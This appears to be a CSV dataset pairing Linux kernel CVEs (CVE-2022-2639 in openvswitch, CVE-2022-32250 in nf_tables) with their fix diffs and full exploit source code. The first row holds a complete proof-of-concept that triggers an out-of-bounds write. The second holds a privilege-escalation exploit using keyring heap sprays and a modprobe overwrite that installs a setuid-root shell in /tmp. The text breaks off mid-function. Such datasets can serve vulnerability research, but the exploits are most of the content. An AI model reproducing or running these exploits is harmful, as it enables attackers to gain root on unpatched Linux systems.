CVE-2022-2639,https://www.opencve.io/cve/CVE-2022-2639,"An integer coercion error was found in the openvswitch kernel module. Given a sufficiently large number of actions, while copying and reserving memory for a new action of a new flow, the reserve_sfa_size() function does not return -EMSGSIZE as expected, potentially leading to an out-of-bounds write access. This flaw allows a local user to crash or potentially escalate their privileges on the system.","
openvswitch: fix OOB access in reserve_sfa_size()
Given a sufficiently large number of actions, while copying and
reserving memory for a new action of a new flow, if next_offset is
greater than MAX_ACTIONS_BUFSIZE, the function reserve_sfa_size() does
not return -EMSGSIZE as expected, but it allocates MAX_ACTIONS_BUFSIZE
bytes increasing actions_len by req_size. This can then lead to an OOB
write access, especially when further actions need to be copied.

Fix it by rearranging the flow action size check.

static struct nlattr *reserve_sfa_size(struct sw_flow_actions **sfa,
				       int attr_len, bool log)
{
	struct sw_flow_actions *acts;
	int new_acts_size;
	size_t req_size = NLA_ALIGN(attr_len);
	int next_offset = offsetof(struct sw_flow_actions, actions) +
					(*sfa)->actions_len;
	if (req_size <= (ksize(*sfa) - next_offset))
		goto out;
	new_acts_size = max(next_offset + req_size, ksize(*sfa) * 2);

	if (new_acts_size > MAX_ACTIONS_BUFSIZE) {
-		if ((MAX_ACTIONS_BUFSIZE - next_offset) < req_size) {
+		if ((next_offset + req_size) > MAX_ACTIONS_BUFSIZE) {
			OVS_NLERR(log, ""Flow action size exceeds max %u"",
				  MAX_ACTIONS_BUFSIZE);
			return ERR_PTR(-EMSGSIZE);",https://github.com/torvalds/linux/commit/cefa91b2332d7009bc0be5d951d6cbbf349f90f8,"// gcc poc.c -o poc -static -no-pie -Werror -s -Os -Wno-unused-result
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/genetlink.h>
#include <linux/if_packet.h>
#include <linux/netlink.h>
#include <linux/openvswitch.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>

#define logd(fmt, ...) dprintf(2, ""[*] %s:%d "" fmt ""\n"", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, ""[+] %s:%d "" fmt ""\n"", __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, ""[!] %s:%d "" fmt ""\n"", __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, ""[-] %s:%d "" fmt ""\n"", __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge(""Exit at line %d"", __LINE__); \
        exit(1);                           \
    } while (0)

struct ovs_attr {
    uint16_t type;
    void *data;
    uint16_t len;
};

#define GENLMSG_DATA(glh) ((void *)(((char *)glh) + GENL_HDRLEN))
#define NLA_DATA(nla) ((void *)((char *)(nla) + NLA_HDRLEN))
#define NLA_NEXT(nla, len) ((len) -= NLA_ALIGN((nla)->nla_len), \
                            (struct nlattr *)(((char *)(nla)) + NLA_ALIGN((nla)->nla_len)))
#define NLA_OK(nla, len) ((len) >= (int)sizeof(struct nlattr) &&     \
                          (nla)->nla_len >= sizeof(struct nlattr) && \
                          (nla)->nla_len <= (len))

int nla_attr_size(int payload) {
    return NLA_HDRLEN + payload;
}

int nla_total_size(int payload) {
    return NLA_ALIGN(nla_attr_size(payload));
}

int genlmsg_open(void) {
    int sockfd;
    struct sockaddr_nl nladdr;
    int ret;

    sockfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (sockfd < 0) {
        loge(""socket: %m"");
        return -1;
    }

    memset(&nladdr, 0, sizeof(nladdr));
    nladdr.nl_family = AF_NETLINK;
    nladdr.nl_pid = getpid();
    // nladdr.nl_groups = 0xffffffff;

    ret = bind(sockfd, (struct sockaddr *)&nladdr, sizeof(nladdr));
    if (ret < 0) {
        loge(""bind: %m"");
        close(sockfd);
        return -1;
    }

    return sockfd;
}

void *genlmsg_alloc(int *size) {
    unsigned char *buf;
    int len;

    /*
     * attribute len
     * attr len = (nla_hdr + pad) + (payload(user data) + pad)
     */
    len = nla_total_size(*size);
    /*
     * family msg len,
     * but actually we have NOT custom family header
     * family msg len = family_hdr + payload(attribute)
     */
    len += 0;
    /*
     * generic netlink msg len
     * genlmsg len = (genlhdr + pad) + payload(family msg)
     */
    len += GENL_HDRLEN;
    /*
     * netlink msg len
     * nlmsg len = (nlmsghdr + pad) + (payload(genlmsg) + pad)
     */
    len = NLMSG_SPACE(len);

    buf = malloc(len);
    if (!buf)
        return NULL;

    memset(buf, 0, len);
    *size = len;

    return buf;
}

void genlmsg_free(void *buf) {
    if (buf) {
        free(buf);
    }
}

int genlmsg_send(int sockfd, unsigned short nlmsg_type, unsigned int nlmsg_pid,
                 unsigned char genl_cmd, unsigned char genl_version,
                 unsigned short nla_type, const void *nla_data, unsigned int nla_len) {
    struct nlmsghdr *nlh;   // netlink message header
    struct genlmsghdr *glh; // generic netlink message header
    struct nlattr *nla;     // netlink attribute header

    struct sockaddr_nl nladdr;
    unsigned char *buf;
    int len;

    int count;
    int ret;

    if ((nlmsg_type == 0) || (!nla_data) || (nla_len <= 0)) {
        return -1;
    }

    len = nla_len;
    buf = genlmsg_alloc(&len);
    if (!buf)
        return -1;

    nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = len;
    nlh->nlmsg_type = nlmsg_type;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;
    nlh->nlmsg_pid = nlmsg_pid;

    glh = (struct genlmsghdr *)NLMSG_DATA(nlh);
    glh->cmd = genl_cmd;
    glh->version = genl_version;

    nla = (struct nlattr *)GENLMSG_DATA(glh);
    nla->nla_type = nla_type;
    nla->nla_len = nla_attr_size(nla_len);
    memcpy(NLA_DATA(nla), nla_data, nla_len);

    memset(&nladdr, 0, sizeof(nladdr));
    nladdr.nl_family = AF_NETLINK;

    count = 0;
    ret = 0;
    do {
        ret = sendto(sockfd, &buf[count], len - count, 0,
                     (struct sockaddr *)&nladdr, sizeof(nladdr));
        if (ret < 0) {
            if (errno != EAGAIN) {
                count = -1;
                goto out;
            }
        } else {
            count += ret;
        }
    } while (count < len);

out:
    genlmsg_free(buf);
    return count;
}

int genlmsg_recv(int sockfd, unsigned char *buf, unsigned int len) {
    struct sockaddr_nl nladdr;
    struct msghdr msg;
    struct iovec iov;

    int ret;

    nladdr.nl_family = AF_NETLINK;
    nladdr.nl_pid = getpid();
    // nladdr.nl_groups = 0xffffffff;

    iov.iov_base = buf;
    iov.iov_len = len;

    msg.msg_name = (void *)&nladdr;
    msg.msg_namelen = sizeof(nladdr);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    ret = recvmsg(sockfd, &msg, 0);
    ret = ret > 0 ? ret : -1;
    return ret;
}

int genlmsg_dispatch(struct nlmsghdr *nlmsghdr, unsigned int nlh_len,
                     int nlmsg_type, int nla_type, unsigned char *buf, int *len) {
    struct nlmsghdr *nlh;
    struct genlmsghdr *glh;
    struct nlattr *nla;
    int nla_len;

    int l;
    int i;
    int ret = -1;

    if (!nlmsghdr || !buf || !len)
        return -1;

    if (nlmsg_type && (nlmsghdr->nlmsg_type != nlmsg_type)) {
        return -1;
    }

    for (nlh = nlmsghdr; NLMSG_OK(nlh, nlh_len); nlh = NLMSG_NEXT(nlh, nlh_len)) {
        /* The end of multipart message. */
        if (nlh->nlmsg_type == NLMSG_DONE) {
            // printf(""get NLMSG_DONE\n"");
            ret = 0;
            break;
        }

        if (nlh->nlmsg_type == NLMSG_ERROR) {
            // printf(""get NLMSG_ERROR\n"");
            ret = -1;
            break;
        }

        glh = (struct genlmsghdr *)NLMSG_DATA(nlh);
        nla = (struct nlattr *)GENLMSG_DATA(glh); // the first attribute
        nla_len = nlh->nlmsg_len - GENL_HDRLEN;   // len of attributes
        for (i = 0; NLA_OK(nla, nla_len); nla = NLA_NEXT(nla, nla_len), ++i) {
            /* Match the family ID, copy the data to user */
            if (nla_type == nla->nla_type) {
                l = nla->nla_len - NLA_HDRLEN;
                *len = *len > l ? l : *len;
                memcpy(buf, NLA_DATA(nla), *len);
                ret = 0;
                break;
            }
        }
    }

    return ret;
}

int genlmsg_get_family_id(int sockfd, const char *family_name) {
    void *buf;
    int len;
    __u16 id;
    int l;
    int ret;

    ret = genlmsg_send(sockfd, GENL_ID_CTRL, 0, CTRL_CMD_GETFAMILY, 1,
                       CTRL_ATTR_FAMILY_NAME, family_name, strlen(family_name) + 1);
    if (ret < 0)
        return -1;

    len = 256;
    buf = genlmsg_alloc(&len);
    if (!buf)
        return -1;

    len = genlmsg_recv(sockfd, buf, len);
    if (len < 0)
        return len;

    id = 0;
    l = sizeof(id);
    genlmsg_dispatch((struct nlmsghdr *)buf, len, 0, CTRL_ATTR_FAMILY_ID, (unsigned char *)&id, &l);

    genlmsg_free(buf);

    return id > 0 ? id : -1;
}

void genlmsg_close(int sockfd) {
    if (sockfd >= 0) {
        close(sockfd);
    }
}

int ovsmsg_send(int sockfd, uint16_t nlmsg_type, uint32_t nlmsg_pid,
                uint8_t genl_cmd, uint8_t genl_version,
                int dp_ifindex, struct ovs_attr *ovs_attrs, int attr_num) {
    struct nlmsghdr *nlh;   // netlink message header
    struct genlmsghdr *glh; // generic netlink message header
    struct nlattr *nla;     // netlink attribute header
    struct ovs_header *ovh; // ovs user header

    struct sockaddr_nl nladdr;
    unsigned char *buf;
    int len = 0;

    int count;
    int ret;

    for (int i = 0; i < attr_num; i++) {
        len += nla_total_size(ovs_attrs[i].len);
    }

    buf = genlmsg_alloc(&len);
    if (!buf) {
        return -1;
    }

    nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = len;
    nlh->nlmsg_type = nlmsg_type;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;
    nlh->nlmsg_pid = nlmsg_pid;

    glh = (struct genlmsghdr *)NLMSG_DATA(nlh);
    glh->cmd = genl_cmd;
    glh->version = genl_version;

    ovh = (struct ovs_header *)GENLMSG_DATA(glh);
    ovh->dp_ifindex = dp_ifindex;
    char *offset = GENLMSG_DATA(glh) + 4;
    for (int i = 0; i < attr_num; i++) {
        nla = (struct nlattr *)(offset);
        nla->nla_type = ovs_attrs[i].type;
        nla->nla_len = nla_attr_size(ovs_attrs[i].len);
        memcpy(NLA_DATA(nla), ovs_attrs[i].data, ovs_attrs[i].len);
        offset += nla_total_size(ovs_attrs[i].len);
    }
    memset(&nladdr, 0, sizeof(nladdr));
    nladdr.nl_family = AF_NETLINK;

    count = 0;
    ret = 0;
    do {
        ret = sendto(sockfd, &buf[count], len - count, 0,
                     (struct sockaddr *)&nladdr, sizeof(nladdr));
        if (ret < 0) {
            if (errno != EAGAIN) {
                count = -1;
                goto out;
            }
        } else {
            count += ret;
        }
    } while (count < len);

out:
    genlmsg_free(buf);
    return count;
}

#define ELEM_CNT(x) (sizeof(x) / sizeof(x[0]))

int nl_sockfd = -1;
int dp_family_id = 1;
int flow_family_id = -1;

void init_unshare() {
    int fd;
    char buff[0x100];

    // strace from `unshare -Ur xxx`
    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    fd = open(""/proc/self/setgroups"", O_WRONLY);
    snprintf(buff, sizeof(buff), ""deny"");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open(""/proc/self/uid_map"", O_WRONLY);
    snprintf(buff, sizeof(buff), ""0 %d 1"", getuid());
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open(""/proc/self/gid_map"", O_WRONLY);
    snprintf(buff, sizeof(buff), ""0 %d 1"", getgid());
    write(fd, buff, strlen(buff));
    close(fd);
}

void bind_cpu() {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(0, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die(""sched_setaffinity: %m"");
    }
}

void init_nl_sock() {
    nl_sockfd = genlmsg_open();
    if (nl_sockfd < 0) {
        die(""open sock failed"");
    }

    dp_family_id = genlmsg_get_family_id(nl_sockfd, OVS_DATAPATH_FAMILY);
    if (dp_family_id < 0) {
        die(""get dp_family_id failed"");
    }

    flow_family_id = genlmsg_get_family_id(nl_sockfd, OVS_FLOW_FAMILY);
    if (flow_family_id < 0) {
        die(""get flow_family_id failed"");
    }

    if (dp_family_id == flow_family_id) {
        // like some bug, but I don't know how to solve it :(
        logw(""id are same, retry ..."");
        genlmsg_close(nl_sockfd);
        init_nl_sock();
    }
}

void do_init() {
    bind_cpu();
    init_unshare();
    init_nl_sock();
}

void trigger_vuln(void *vuln_data, size_t vuln_size) {
    struct nlattr *key_nla;

    struct ovs_key_ethernet eth_key;
    memcpy(eth_key.eth_src, ""\x01\x02\x03\x04\x05"", 6);
    memcpy(eth_key.eth_dst, ""\x05\x04\x03\x02\x01"", 6);

    struct ovs_key_ipv4 ipv4_key = {
        .ipv4_src = 0x12345678,
        .ipv4_dst = 0x87654321,
        .ipv4_proto = 1,
        .ipv4_tos = 1,
        .ipv4_ttl = 1,
        .ipv4_frag = 2,
    };

    struct ovs_attr key_attrs[] = {
        {OVS_KEY_ATTR_ETHERNET, &eth_key, sizeof(struct ovs_key_ethernet)},
        {OVS_KEY_ATTR_ETHERTYPE, ""\x08\x00"", 2},
        {OVS_KEY_ATTR_IPV4, &ipv4_key, sizeof(struct ovs_key_ipv4)},
    };

    int key_size = 0;
    for (int i = 0; i < ELEM_CNT(key_attrs); i++) {
        key_size += nla_total_size(key_attrs[i].len);
    }

    key_nla = (struct nlattr *)malloc(key_size);
    void *key_offset = key_nla;
    for (int i = 0; i < ELEM_CNT(key_attrs); i++) {
        struct nlattr *nla = key_offset;
        nla->nla_type = key_attrs[i].type;
        nla->nla_len = nla_attr_size(key_attrs[i].len);
        memcpy(NLA_DATA(nla), key_attrs[i].data, key_attrs[i].len);
        key_offset += nla_total_size(key_attrs[i].len);
    }

    char *action_nla = (char *)malloc(0x10000);
    if (!action_nla) {
        die(""malloc: %m"");
    }

    // 0x14 -> 0x20 (+0xc)
    const int ori_size = 0x14;
    const int rewrite_size = 0x1c;
    const int header_size = 0x1c;

    int pad_action_cnt = (0xfc00 - header_size) / (4 + rewrite_size);

    int i = 0;
    for (i = 0; i < pad_action_cnt; i++) {
        struct nlattr *ptr = (struct nlattr *)(action_nla + i * ori_size);
        ptr->nla_len = ori_size;
        ptr->nla_type = OVS_ACTION_ATTR_SET;

        ptr = NLA_DATA(ptr);
        ptr->nla_len = 0x10;
        ptr->nla_type = OVS_KEY_ATTR_ETHERNET;

        ptr = NLA_DATA(ptr);
        memset(ptr, 'k', 0xc);
    }

    const uint32_t padding_size = 0x10000 - (header_size + (4 + rewrite_size) * pad_action_cnt);
    uint16_t evil_size = padding_size + vuln_size;
    {
        struct nlattr *ptr = (struct nlattr *)(action_nla + i * ori_size);
        ptr->nla_len = evil_size;
        ptr->nla_type = OVS_ACTION_ATTR_USERSPACE;

        // sub attr1
        struct nlattr *sub_ptr = NLA_DATA(ptr);
        sub_ptr->nla_len = 8;
        sub_ptr->nla_type = OVS_USERSPACE_ATTR_PID;
        char *sub_buff = NLA_DATA(sub_ptr);
        memset(sub_buff, 'A', 4);

        char *padding_ptr = ((char *)sub_ptr) + NLA_ALIGN(sub_ptr->nla_len);
        memset(padding_ptr, 'x', padding_size - (padding_ptr - (char *)ptr));

        memcpy((char *)action_nla + i * ori_size + padding_size, vuln_data, vuln_size);
    }

    struct ovs_attr ovs_attrs[] = {
        {OVS_FLOW_ATTR_KEY, key_nla, key_size},
        {OVS_FLOW_ATTR_ACTIONS, action_nla, nla_total_size(0xff00)},
    };

    ovsmsg_send(nl_sockfd, flow_family_id, 0, OVS_FLOW_CMD_NEW, OVS_FLOW_VERSION,
                0, ovs_attrs, ELEM_CNT(ovs_attrs));
}

int main(int argc, char **argv) {
    do_init();

    char vuln_buf[0x1000];
    memset(vuln_buf, 'A', 0x1000);
    trigger_vuln(&vuln_buf, sizeof(vuln_buf));
    return 0;
}

",https://github.com/bb33bb/CVE-2022-2639-PipeVersion/tree/master,,,
CVE-2022-32250,https://www.opencve.io/cve/CVE-2022-32250,net/netfilter/nf_tables_api.c in the Linux kernel through 5.18.1 allows a local user (able to create user/net namespaces) to escalate privileges to root because an incorrect NFT_STATEFUL_EXPR check leads to a use-after-free.,"netfilter: nf_tables: disallow non-stateful expression in sets earlier
Since 3e135cd499bf (""netfilter: nft_dynset: dynamic stateful expression
instantiation""), it is possible to attach stateful expressions to set
elements.

cd5125d8f518 (""netfilter: nf_tables: split set destruction in deactivate
and destroy phase"") introduces conditional destruction on the object to
accomodate transaction semantics.

nft_expr_init() calls expr->ops->init() first, then check for
NFT_STATEFUL_EXPR, this stills allows to initialize a non-stateful
lookup expressions which points to a set, which might lead to UAF since
the set is not properly detached from the set->binding for this case.
Anyway, this combination is non-sense from nf_tables perspective.

This patch fixes this problem by checking for NFT_STATEFUL_EXPR before
expr->ops->init() is called.

The reporter provides a KASAN splat and a poc reproducer (similar to
those autogenerated by syzbot to report use-after-free errors). It is
unknown to me if they are using syzbot or if they use similar automated
tool to locate the bug that they are reporting.

For the record, this is the KASAN splat.

[   85.431824] ==================================================================
[   85.432901] BUG: KASAN: use-after-free in nf_tables_bind_set+0x81b/0xa20
[   85.433825] Write of size 8 at addr ffff8880286f0e98 by task poc/776
[   85.434756]
[   85.434999] CPU: 1 PID: 776 Comm: poc Tainted: G        W         5.18.0+ #2
[   85.436023] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.14.0-2 04/01/2014

Fixes: 0b2d8a7b638b (""netfilter: nf_tables: add helper functions for expression handling"")
Reported-and-tested-by: Aaron Adams <edg-e@nccgroup.com>
Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
Diffstat (limited to 'net/netfilter')
-rw-r--r--	net/netfilter/nf_tables_api.c	19	
1 files changed, 10 insertions, 9 deletions
diff --git a/net/netfilter/nf_tables_api.c b/net/netfilter/nf_tables_api.c
index 12fc9cda4a2cff..f296dfe86b6225 100644
--- a/net/netfilter/nf_tables_api.c
+++ b/net/netfilter/nf_tables_api.c
@@ -2873,27 +2873,31 @@ static struct nft_expr *nft_expr_init(const struct nft_ctx *ctx,
 
 	err = nf_tables_expr_parse(ctx, nla, &expr_info);
 	if (err < 0)
-		goto err1;
+		goto err_expr_parse;
+
+	err = -EOPNOTSUPP;
+	if (!(expr_info.ops->type->flags & NFT_EXPR_STATEFUL))
+		goto err_expr_stateful;
 
 	err = -ENOMEM;
 	expr = kzalloc(expr_info.ops->size, GFP_KERNEL_ACCOUNT);
 	if (expr == NULL)
-		goto err2;
+		goto err_expr_stateful;
 
 	err = nf_tables_newexpr(ctx, &expr_info, expr);
 	if (err < 0)
-		goto err3;
+		goto err_expr_new;
 
 	return expr;
-err3:
+err_expr_new:
 	kfree(expr);
-err2:
+err_expr_stateful:
 	owner = expr_info.ops->type->owner;
 	if (expr_info.ops->type->release_ops)
 		expr_info.ops->type->release_ops(expr_info.ops);
 
 	module_put(owner);
-err1:
+err_expr_parse:
 	return ERR_PTR(err);
 }
 
@@ -5413,9 +5417,6 @@ struct nft_expr *nft_set_elem_expr_alloc(const struct nft_ctx *ctx,
 		return expr;
 
 	err = -EOPNOTSUPP;
-	if (!(expr->ops->type->flags & NFT_EXPR_STATEFUL))
-		goto err_set_elem_expr;
-
 	if (expr->ops->type->flags & NFT_EXPR_GC) {
 		if (set->flags & NFT_SET_TIMEOUT)
 			goto err_set_elem_expr;",https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/net/netfilter?id=520778042ccca019f3ffa136dd0ca565c486cedd,"// gcc exp.c -o exp -l mnl -l nftnl -w
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <sched.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <err.h>
#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/table.h>
#include <libnftnl/set.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <sched.h>
#include <sys/types.h>
#include <signal.h>
#include <net/if.h>
#include <asm/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/socket.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <assert.h>
#include <netinet/in.h>
#include <stdint.h>
#include <syscall.h>
#include <mqueue.h>
#include <linux/io_uring.h>
#include <linux/keyctl.h>
#include <sys/shm.h>
#include <sys/ipc.h>
#include <sys/types.h>
#include <sys/mman.h>

#define MQUEUE_NUM 5


#define INBOUND 0
#define OUTBOUND 1
#define DESC_MAX 0x800

#define BUFFER 0x100
#define NAMELEN 0x100
#define ERROR_PREFIX ""err: ""

#define KEY_DESC_MAX_SIZE 40

#define PREFIX_BUF_LEN 16
#define RCU_HEAD_LEN 16

#define SPRAY_KEY_SIZE 50

#define PHYSMAP_MASK 0xffffffff00000000

#define SPRAY_SIZE 1000

#define SPRAY_NB_ENTRIES 10

uint64_t base_base;
uint64_t heap_base;
uint64_t modprobe_addr;

enum nft_trans_phase {
        NFT_TRANS_PREPARE,
        NFT_TRANS_ABORT,
        NFT_TRANS_COMMIT,
        NFT_TRANS_RELEASE
};

typedef struct 
{
        long mtype;
        char mtext[1];
}msg;

typedef struct 
{
    void *ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security;
}msg_header;

typedef struct
{
  char name[BUFFER];
} Msg;

typedef struct
{
    char iface[16];
    char name[16];
    char ip[16];
    char netmask[16];
    uint8_t idx;
    uint8_t type;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
    char desc[DESC_MAX];
} user_rule_t;


struct keyring_payload {
    uint8_t prefix[PREFIX_BUF_LEN];
    uint8_t rcu_buf[RCU_HEAD_LEN];
    unsigned short len;
};

struct leak {
    long kaslr_base;
    long physmap_base;
};

struct fd_uring {
    int fd;
    struct io_uring_params *params;
};

typedef int32_t key_serial_t;

const char priv_file[] = ""/tmp/shell.c\0"";
const char dummy_file[] = ""/tmp/dummy\0"";

const char priv_context[] = ""#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nint main(int argc, char **argv){if (geteuid() == 0){setuid(0);setgid(0);puts(\""[+] I am root\"");system(\""bash\"");}}\x00"";
const char dummy_content[] = ""\xff\xff\xff\xff"";
const char new_modprobe_content[] = ""#!/bin/bash\n\nchown root:root /tmp/shell\nchmod 4555 /tmp/shell\n"";



static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid) {
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) {
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}

void bye(char *info)
{
    puts(info);
    exit(-2);
}

void do_error_exit(char *info)
{
    puts(info);
    exit(-1);
}

void bye2(char *info, char *arg)
{
    printf(info, arg);
}

key_serial_t *spray_keyring(uint32_t start, uint32_t spray_size) {

    char key_desc[KEY_DESC_MAX_SIZE];
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    if (id_buffer == NULL)
        bye(""calloc"");

    for (uint32_t i = start; i < start+spray_size; i++) {
        snprintf(key_desc, KEY_DESC_MAX_SIZE, ""SPRAY-RING-%03du"", i);
        id_buffer[i] = add_key(""user"", key_desc, key_desc, strlen(key_desc), KEY_SPEC_PROCESS_KEYRING);
        if (id_buffer[i] < 0)
            bye(""add_key"");
    }

    return id_buffer;
}

key_serial_t *spray_keyring_list_del_purpose(uint32_t spray_size, uint64_t next, uint64_t prev, uint64_t size)
{
    // next[0x8] = prev, prev[0x0] = next allocation occured at gather mqueue
    char key_desc[KEY_DESC_MAX_SIZE];
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    char temp[0x20];
    memcpy(temp+0x0, &next, 8);
    memcpy(temp+0x8, &prev, 8);
    memcpy(temp+0x10, ""12341234"", 8);
    memcpy(temp+0x18, &size, 8);

    if (id_buffer == NULL)
        do_error_exit(""calloc"");

    for (uint32_t i = 0; i < spray_size; i++) {
        id_buffer[i] = add_key(""user"", temp, temp, 0x20, KEY_SPEC_PROCESS_KEYRING);
        if (id_buffer[i] < 0)
            do_error_exit(""add_key"");
    }

    return id_buffer;
}

key_serial_t *spray_keyring_list_overwrite_purpose(uint32_t spray_size, uint64_t len, uint64_t off_18, 
                                                    uint64_t off_20, uint64_t off_28, uint64_t off_30, uint64_t off_38)
{
    char key_desc[KEY_DESC_MAX_SIZE];
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    char temp[0x40];
    switch((len-1)/8)
    {
        case 0:
            memcpy(temp+0x0, &off_18, 8);
        case 1:
            memcpy(temp+0x8, &off_20, 8);
        case 2:
            memcpy(temp+0x10, &off_28, 8);
        case 3:
            memcpy(temp+0x18, &off_30, 8);
        case 4:
            memcpy(temp+0x20, &off_38, 8);
            break;
        default:
            bye(""add_key - assert(len <= 0x28)"");
    }

    for (uint32_t i = 0; i < spray_size; i++) {
        snprintf(key_desc, KEY_DESC_MAX_SIZE, temp);
        id_buffer[i] = add_key(""user"", temp, temp, len, KEY_SPEC_PROCESS_KEYRING);
        if (id_buffer[i] < 0)
            do_error_exit(""add_key"");
    }

    return id_buffer;
}

int get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size) {
    
    uint8_t buffer[USHRT_MAX] = {0};
    int32_t keylen;

    for (uint32_t i = 0; i < id_buffer_size; i++) {

        keylen = keyctl(KEYCTL_READ, id_buffer[i], (long)buffer, 0x10, 0);
        if (keylen < 0)
            bye(""keyctl"");

        if(!strncmp(&buffer[6],""\xff\xff"", 2))
        {
            heap_base = *((uint64_t*)buffer);
            printf(""[+] leak successed, kmalloc-64 heap: 0x%llx\n"", heap_base);
            return i;
        }
        else
            printf(""[-] leak failed, idkval: %s\n"", buffer);
    }
    return id_buffer_size;
}

void awake_partial_keys(key_serial_t *id_buffer, uint32_t idx) {
    uint8_t buffer[USHRT_MAX] = {0};
    int32_t keylen;
    keylen = keyctl(KEYCTL_UPDATE, id_buffer[idx], (long)buffer, 0x10, 0);
}



void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size) 
{
    
    for (uint32_t i = 0; i < id_buffer_size; i++) {
        if (keyctl(KEYCTL_REVOKE, id_buffer[i], 0, 0, 0) < 0)
            do_error_exit(""keyctl(KEYCTL_REVOKE)"");
    }

    free(id_buffer);
}

void release_partial_keys(key_serial_t *id_buffer, int i) 
{
    if (keyctl(KEYCTL_REVOKE, id_buffer[i], 0, 0, 0) < 0)
        do_error_exit(""keyctl(KEYCTL_REVOKE)"");
}


void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);

    temp = open(""/proc/self/setgroups"", O_WRONLY);
    write(temp, ""deny"", strlen(""deny""));
    close(temp);

    temp = open(""/proc/self/uid_map"", O_WRONLY);
    snprintf(edit, sizeof(edit), ""0 %d 1"", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open(""/proc/self/gid_map"", O_WRONLY);
    snprintf(edit, sizeof(edit), ""0 %d 1"", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}


void set_stable_table_and_set(struct mnl_socket* nl, const char *name)
{
    char * table_name = name;
    char * set_name = NULL;
    uint8_t family = NFPROTO_IPV4;
    uint32_t set_id = 1;

    // a table for the sets to be associated with
    struct nftnl_table * table = nftnl_table_alloc();
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
    nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);

    struct nftnl_set * set_stable =  nftnl_set_alloc();
    set_name = ""set_stable"";
    nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set_stable, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, 1);
    nftnl_set_set_u32(set_stable, NFTNL_SET_FAMILY, family);
    nftnl_set_set_u32(set_stable, NFTNL_SET_ID, set_id++);

    // expressions
    struct nftnl_expr * exprs[128];
    int exprid = 0;

    // serialize
    char buf[MNL_SOCKET_BUFFER_SIZE*2];

    struct mnl_nlmsg_batch * batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
    int seq = 0;

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    struct nlmsghdr * nlh;
    int table_seq = seq;

    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
NFT_MSG_NEWTABLE, family, NLM_F_CREATE|NLM_F_ACK, seq++);
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    // add set_stable
    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWSET, family,
                                    NLM_F_CREATE|NLM_F_ACK, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set_stable);
    nftnl_set_free(set_stable);
    mnl_nlmsg_batch_next(batch);

